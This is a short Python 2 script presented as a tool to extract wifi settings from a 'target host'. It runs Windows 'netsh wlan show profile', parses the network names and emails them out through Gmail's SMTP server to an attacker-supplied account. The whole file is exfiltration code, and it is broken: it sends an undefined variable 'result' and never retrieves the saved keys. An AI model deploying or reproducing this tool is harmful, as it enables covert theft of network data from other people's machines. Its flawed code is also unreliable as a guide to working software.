#! /usr/bin/python
"""A simple script used to extract wifi settings from a target host.
   Uses Python 2.7.16"""

import subprocess
import optparse
import smtplib
import re


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()
    # arguments
    parser.add_option('-e', '--email', dest='email', help='Email address to send data to')
    parser.add_option('-p', '--password', dest='password', help='Email password')

    (options, arguments) = parser.parse_args()

    return options


def send_mail(email, password, message):
    """Sends email with """
    server = smtplib.SMTP('smtp.gmail.com', 587)                # gmail smtp server address and port
    server.starttls()
    server.login(email, password)                               # logs into email account
    server.sendmail(email, email, message)                      # sends email from 'email' account to 'email' account
    server.quit()


options = get_arguments()

command = 'netsh wlan show profile'                                 # shows wifi profile
networks = subprocess.check_output(command, shell=True)
network_names = re.findall('(?:Profile\s*:\s)(.*)', networks)       # regex to search for network SSIDs

send_mail(options.email, options.password, result)
